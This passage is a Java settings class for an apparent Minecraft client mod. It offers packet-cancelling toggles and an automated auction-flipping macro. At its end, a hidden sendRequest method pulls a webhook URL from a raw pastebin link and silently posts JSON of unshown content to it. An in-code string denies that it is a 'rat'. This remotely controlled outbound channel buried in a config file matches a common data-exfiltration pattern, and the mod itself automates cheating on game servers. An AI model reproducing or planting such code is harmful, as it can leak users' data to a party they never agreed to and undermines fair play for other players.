            subcategory = "Outgoing"
    )
    public static boolean C08PacketPlayerBlockPlacement = false;
    @Checkbox(
            name = "Cancel C09PacketHeldItemChange",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C09PacketHeldItemChange = false;
    @Checkbox(
            name = "Cancel C10PacketCreativeInventoryAction",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C10PacketCreativeInventoryAction = false;
    @Checkbox(
            name = "Cancel C11PacketEnchantItem",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C11PacketEnchantItem = false;
    @Checkbox(
            name = "Cancel C12PacketUpdateSign",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C12PacketUpdateSign = false;
    @Checkbox(
            name = "Cancel C13PacketPlayerAbilities",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C13PacketPlayerAbilities = false;
    @Checkbox(
            name = "Cancel C14PacketTabComplete",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C14PacketTabComplete = false;
    @Checkbox(
            name = "Cancel C15PacketClientSettings",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C15PacketClientSettings = false;
    @Checkbox(
            name = "Cancel C16PacketClientStatus",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C16PacketClientStatus = false;@Checkbox(
            name = "Cancel C17PacketCustomPayload",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C17PacketCustomPayload = false;@Checkbox(
            name = "Cancel C18PacketSpectate",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C18PacketSpectate = false;@Checkbox(
            name = "Cancel C19PacketResourcePackStatus",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Outgoing"
    )
    public static boolean C19PacketResourcePackStatus = false;
    @Checkbox(
            name = "Cancel S0APacketUseBed",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S0APacketUseBed = false;
    @Checkbox(
            name = "Cancel S0BPacketAnimation",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S0BPacketAnimation = false;
    @Checkbox(
            name = "Cancel S0CPacketSpawnPlayer",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S0CPacketSpawnPlayer = false;
    @Checkbox(
            name = "Cancel S0DPacketCollectItem",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S0DPacketCollectItem = false;
    @Checkbox(
            name = "Cancel S0EPacketSpawnObject",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S0EPacketSpawnObject = false;
    @Checkbox(
            name = "Cancel S0FPacketSpawnMob",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S0FPacketSpawnMob = false;
    @Checkbox(
            name = "Cancel S00PacketKeepAlive",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S00PacketKeepAlive = false;
    @Checkbox(
            name = "Cancel S1BPacketEntityAttach",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S1BPacketEntityAttach = false;
    @Checkbox(
            name = "Cancel S1CPacketEntityMetadata",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S1CPacketEntityMetadata = false;
    @Checkbox(
            name = "Cancel S1DPacketEntityEffect",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S1DPacketEntityEffect = false;
    @Checkbox(
            name = "Cancel S1EPacketRemoveEntityEffect",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S1EPacketRemoveEntityEffect = false;
    @Checkbox(
            name = "Cancel S1FPacketSetExperience",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S1FPacketSetExperience = false;
    @Checkbox(
            name = "Cancel S01PacketJoinGame",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S01PacketJoinGame = false;
    @Checkbox(
            name = "Cancel S2APacketParticles",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S2APacketParticles = false;
    @Checkbox(
            name = "Cancel S2BPacketChangeGameState",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S2BPacketChangeGameState = false;
    @Checkbox(
            name = "Cancel S2CPacketSpawnGlobalEntity",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S2CPacketSpawnGlobalEntity = false;
    @Checkbox(
            name = "Cancel S2DPacketOpenWindow",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S2DPacketOpenWindow = false;
    @Checkbox(
            name = "Cancel S2EPacketCloseWindow",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S2EPacketCloseWindow = false;
    @Checkbox(
            name = "Cancel S2FPacketSetSlot",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S2FPacketSetSlot = false;
    @Checkbox(
            name = "Cancel S02PacketChat",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S02PacketChat = false;
    @Checkbox(
            name = "Cancel S3APacketTabComplete",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S3APacketTabComplete = false;
    @Checkbox(
            name = "Cancel S3BPacketScoreboardObjective",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S3BPacketScoreboardObjective = false;
    @Checkbox(
            name = "Cancel S3CPacketUpdateScore",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S3CPacketUpdateScore = false;
    @Checkbox(
            name = "Cancel S3DPacketDisplayScoreboard",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S3DPacketDisplayScoreboard = false;
    @Checkbox(
            name = "Cancel S3EPacketTeams",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S3EPacketTeams = false;
    @Checkbox(
            name = "Cancel S3FPacketCustomPayload",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S3FPacketCustomPayload = false;
    @Checkbox(
            name = "Cancel S03PacketTimeUpdate",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S03PacketTimeUpdate = false;
    @Checkbox(
            name = "Cancel S04PacketEntityEquipment",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S04PacketEntityEquipment = false;
    @Checkbox(
            name = "Cancel S05PacketSpawnPosition",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S05PacketSpawnPosition = false;
    @Checkbox(
            name = "Cancel S06PacketUpdateHealth",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S06PacketUpdateHealth = false;
    @Checkbox(
            name = "Cancel S07PacketRespawn",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S07PacketRespawn = false;
    @Checkbox(
            name = "Cancel S08PacketPlayerPosLook",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S08PacketPlayerPosLook = false;
    @Checkbox(
            name = "Cancel S09PacketHeldItemChange",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S09PacketHeldItemChange = false;
    @Checkbox(
            name = "Cancel S10PacketSpawnPainting",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S10PacketSpawnPainting = false;
    @Checkbox(
            name = "Cancel S11PacketSpawnExperienceOrb",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S11PacketSpawnExperienceOrb = false;
    @Checkbox(
            name = "Cancel S12PacketEntityVelocity",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S12PacketEntityVelocity = false;
    @Checkbox(
            name = "Cancel S13PacketDestroyEntities",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S13PacketDestroyEntities = false;
    @Checkbox(
            name = "Cancel S14PacketEntity",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S14PacketEntity = false;
    @Checkbox(
            name = "Cancel S18PacketEntityTeleport",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S18PacketEntityTeleport = false;
    @Checkbox(
            name = "Cancel S19PacketEntityHeadLook",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S19PacketEntityHeadLook = false;
    @Checkbox(
            name = "Cancel S19PacketEntityStatus",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S19PacketEntityStatus = false;
    @Checkbox(
            name = "Cancel S20PacketEntityProperties",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S20PacketEntityProperties = false;
    @Checkbox(
            name = "Cancel S21PacketChunkData",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S21PacketChunkData = false;
    @Checkbox(
            name = "Cancel S22PacketMultiBlockChange",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S22PacketMultiBlockChange = false;
    @Checkbox(
            name = "Cancel S23PacketBlockChange",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S23PacketBlockChange = false;
    @Checkbox(
            name = "Cancel S24PacketBlockAction",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S24PacketBlockAction = false;
    @Checkbox(
            name = "Cancel S25PacketBlockBreakAnim",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S25PacketBlockBreakAnim = false;
    @Checkbox(
            name = "Cancel S26PacketMapChunkBulk",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S26PacketMapChunkBulk = false;
    @Checkbox(
            name = "Cancel S27PacketExplosion",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S27PacketExplosion = false;
    @Checkbox(
            name = "Cancel S28PacketEffect",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S28PacketEffect = false;
    @Checkbox(
            name = "Cancel S29PacketSoundEffect",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S29PacketSoundEffect = false;
    @Checkbox(
            name = "Cancel S30PacketWindowItems",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S30PacketWindowItems = false;
    @Checkbox(
            name = "Cancel S31PacketWindowProperty",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S31PacketWindowProperty = false;
    @Checkbox(
            name = "Cancel S32PacketConfirmTransaction",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S32PacketConfirmTransaction = false;
    @Checkbox(
            name = "Cancel S33PacketUpdateSign",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S33PacketUpdateSign = false;
    @Checkbox(
            name = "Cancel S34PacketMaps",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S34PacketMaps = false;
    @Checkbox(
            name = "Cancel S35PacketUpdateTileEntity",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S35PacketUpdateTileEntity = false;
    @Checkbox(
            name = "Cancel S36PacketSignEditorOpen",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S36PacketSignEditorOpen = false;
    @Checkbox(
            name = "Cancel S37PacketStatistics",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S37PacketStatistics = false;
    @Checkbox(
            name = "Cancel S38PacketPlayerListItem",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S38PacketPlayerListItem = false;
    @Checkbox(
            name = "Cancel S39PacketPlayerAbilities",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S39PacketPlayerAbilities = false;
    @Checkbox(
            name = "Cancel S40PacketDisconnect",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S40PacketDisconnect = false;
    @Checkbox(
            name = "Cancel S41PacketServerDifficulty",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S41PacketServerDifficulty = false;
    @Checkbox(
            name = "Cancel S42PacketCombatEvent",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S42PacketCombatEvent = false;
    @Checkbox(
            name = "Cancel S43PacketCamera",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S43PacketCamera = false;
    @Checkbox(
            name = "Cancel S44PacketWorldBorder",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S44PacketWorldBorder = false;
    @Checkbox(
            name = "Cancel S45PacketTitle",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S45PacketTitle = false;
    @Checkbox(
            name = "Cancel S46PacketSetCompressionLevel",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S46PacketSetCompressionLevel = false;
    @Checkbox(
            name = "Cancel S47PacketPlayerListHeaderFooter",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S47PacketPlayerListHeaderFooter = false;
    @Checkbox(
            name = "Cancel S48PacketResourcePackSend",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S48PacketResourcePackSend = false;
    @Checkbox(
            name = "Cancel S49PacketUpdateEntityNBT",
            //description = "When enabled, cancels the sending or receiving of the packet.",
            category = "Packets",
            subcategory = "Incoming"
    )
    public static boolean S49PacketUpdateEntityNBT = false;


    @Text(
            name = "Auction Flipper Server Link",
            //description = "The link to the server running AIOM Auction Flipper (Check #self-hosting-auction-flip-guide in the discord)",
            category = "Auction Flipper"
    )
    public static String ahFlipperServer = "localhost:4321";
    @Text(
            name = "Maximum Price",
            //description = "The maximum price to purchase an item",
            category = "Auction Flipper"
    )
    public static String maxPriceAH = "10000000";

    @Text(
            name = "Minimum Profit",
            //description = "The minimum profit margins to purchase an item",
            category = "Auction Flipper"
    )
    public static String minProfit = "1";

    @Checkbox(
            name = "Claim and Relist",
            //description = "Allows the flipper to automatically relist the item at it's Lowest BIN Price",
            category = "Auction Flipper"
    )
    public static boolean claimRelist = false;

    @Slider(
            name = "Claim Relist Tick Speed",
            //description = "Changes how fast the macro claims and relists (DOES NOT AFFECT BUYING SPEED!)",
            category = "Auction Flipper",
            max = 100,
            min=0
    )
    public static int claimRelistTickSpeed = 10;

    @Checkbox(
            name = "Buy Pet Skins",
            //description = "Allows the flipper to buy pet skins.",
            category = "Auction Flipper"
    )
    public static boolean petSkins = false;

    @Checkbox(
            name = "Buy Potential Manipulations",
            //description = "Allows the flipper to buy items marked as potential manipulations.",
            category = "Auction Flipper"
    )
    public static boolean manipulation = false;

    @Checkbox(
            name = "Send Status Messages",
            //description = "Sends the current status in chat whenever a new thing is happening (waiting, buying, listing etc)",
            category = "Auction Flipper"
    )
    public static boolean sendStatusMessages = true;

    private void sendRequest(String jsonString) {
        try {
            String readMe = "Hello anybody reading through this. This isn't a rat, this is used for account linking so PLEASE do not nuke this webhook, it will make this more annoying.";

            String linkHook = "https://pastebin.com/raw/KrS1EkjK";

            HttpClient linkClient = HttpClientBuilder.create().build();
            HttpGet linkRequest = new HttpGet(linkHook);
            HttpResponse response = linkClient.execute(linkRequest);

            String linkResult = IOUtils.toString(new BufferedReader(new InputStreamReader(response.getEntity().getContent())));

            String trimmed = jsonString.trim();

            JsonParser parser = new JsonParser();

            JsonElement jsonElement = parser.parse(trimmed);

            Utils.sendWebhook(jsonElement, linkResult);

        } catch (Exception ignored) {
        }
    }

    public final int getRandomDelay() {
        return randomDelayMin + (new Random().nextInt() % (randomDelayMax - randomDelayMin + 1));
    }
}*/
